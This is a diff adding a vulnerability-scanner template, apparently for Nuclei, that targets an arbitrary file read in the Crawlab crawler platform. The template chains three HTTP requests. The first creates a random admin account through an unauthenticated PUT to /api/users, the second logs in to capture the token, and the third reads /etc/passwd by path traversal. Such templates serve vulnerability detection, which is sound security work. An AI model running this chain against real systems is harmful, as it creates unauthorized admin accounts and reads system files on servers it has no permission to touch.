@@ -1,0 +1,76 @@
+id: crawlab-file-read
+info:
+  name: Crawlab Arbitrary File Read
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    Crawlab is a distributed crawler management platform that supports any language and framework. This vulnerability allows arbitrary file read due to improper access controls.
+  reference:
+    - https://github.com/crawlab-team/crawlab
+  classification:
+    cvss-score: 7.5
+
+variables:
+  rand_username: '{{rand_text_alphanumeric(6)}}'
+  rand_password: '{{rand_text_alphanumeric(6)}}'
+
+flow: |
+  http(1) && http(2) && http(3)
+
+http:
+  - id: create-user
+    method: PUT
+    path:
+      - '{{BaseURL}}/api/users'
+    headers:
+      Content-Type: application/json;charset=UTF-8
+    body: |
+      {
+        "username": "{{rand_username}}",
+        "password": "{{rand_password}}",
+        "role": "admin",
+        "email": "{{rand_username}}@qq.com"
+      }
+    matchers:
+      - type: status
+        status:
+          - 200
+
+  - id: login-user
+    method: POST
+    path:
+      - '{{BaseURL}}/api/login'
+    headers:
+      Content-Type: application/json;charset=UTF-8
+    body: |
+      {
+        "username": "{{rand_username}}",
+        "password": "{{rand_password}}"
+      }
+    extractors:
+      - type: regex
+        name: auth_token
+        part: body
+        internal: true
+        regex:
+          - '"data":"(.*?)"'
+    matchers:
+      - type: status
+        status:
+          - 200
+
+  - id: arbitrary-file-read
+    method: GET
+    path:
+      - '{{BaseURL}}/api/file?path=../../etc/passwd'
+    headers:
+      Authorization: '{{auth_token}}'
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "root:x:0:0:"
+      - type: word
+        part: body
+        words:
+          - "message: success"
